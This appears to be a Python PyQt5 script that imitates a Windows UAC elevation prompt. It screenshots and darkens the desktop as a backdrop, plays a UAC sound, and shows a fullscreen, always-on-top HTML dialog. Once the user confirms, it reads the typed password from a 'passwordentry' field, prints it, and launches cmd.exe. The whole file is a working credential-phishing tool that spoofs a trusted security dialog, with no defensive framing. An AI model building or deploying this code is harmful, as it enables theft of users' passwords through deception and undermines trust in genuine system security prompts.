from PyQt5 import QtWidgets, QtWebEngineWidgets, QtWebChannel, QtCore
from PyQt5.QtMultimedia import QMediaPlayer, QMediaContent
from PyQt5.QtCore import QUrl 
from pyautogui import screenshot
import cv2, numpy as np
import subprocess as sp
from subprocess import CREATE_NEW_CONSOLE
import sys, os

def apply_black_blur(filename: str, output: str = "output.jpg", blur_strength: int = 25, darkness: float = 0.5):
    img = cv2.imread(filename)
    if img is None:
        raise ValueError(f"Cannot load image: {filename}")

    blur = cv2.GaussianBlur(img, (blur_strength, blur_strength), 0)
    black_overlay = np.zeros_like(img, dtype=np.uint8)
    dark_blur = cv2.addWeighted(blur, 1 - darkness, black_overlay, darkness, 0)
    cv2.imwrite(output, dark_blur)

    return output

def play_mp3_background(file_path: str):
    global player
    player = QMediaPlayer()
    url = QUrl.fromLocalFile(file_path)
    content = QMediaContent(url)
    player.setMedia(content)
    player.setVolume(50)
    player.play()

class Bridge(QtCore.QObject):
    def __init__(self, view: QtWebEngineWidgets.QWebEngineView, app: QtWidgets.QApplication, program_to_run: str=None, parent=None):
        super().__init__(parent)
        self.view = view
        self.program = program_to_run
        self.app = app

    @QtCore.pyqtSlot(str)
    def on_yes(self):
        self.view.page().runJavaScript(
            "window.passwordentry.value;",
            self.handle_password_result
        )

    def handle_password_result(self, result: str) -> None:
        if result:
            print(result)
        try:
            if self.program:
                sp.Popen(self.program, creationflags=CREATE_NEW_CONSOLE)
        except Exception as e:
            print("Error running program:", e)
        self.on_no()

    @QtCore.pyqtSlot()
    def on_no(self):
        self.app.quit()
        sys.exit()


def main():
    screenshot("background.png")
    apply_black_blur("background.png", "background.png")
    app = QtWidgets.QApplication(sys.argv)
    html_file = os.path.abspath("index.html")
    play_mp3_background(os.path.join("assets", "uacsound.mp3"))
    window = QtWidgets.QWidget()
    window.setWindowFlags(
        QtCore.Qt.FramelessWindowHint |
        QtCore.Qt.WindowStaysOnTopHint |
        QtCore.Qt.Window
    )
    #window.setAttribute(QtCore.Qt.WA_TranslucentBackground)

    screen = app.primaryScreen().size()
    window.resize(screen.width(), screen.height())

    view = QtWebEngineWidgets.QWebEngineView()
    #view.setAttribute(QtCore.Qt.WA_TranslucentBackground)
    #view.page().setBackgroundColor(QtCore.Qt.transparent)
    view.load(QtCore.QUrl.fromLocalFile(html_file))

    channel = QtWebChannel.QWebChannel()
    bridge = Bridge(view=view, app=app, program_to_run="cmd.exe")
    channel.registerObject("bridge", bridge)
    view.page().setWebChannel(channel)

    layout = QtWidgets.QVBoxLayout(window)
    layout.setContentsMargins(0, 0, 0, 0)
    layout.addWidget(view)

    window.showFullScreen()
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()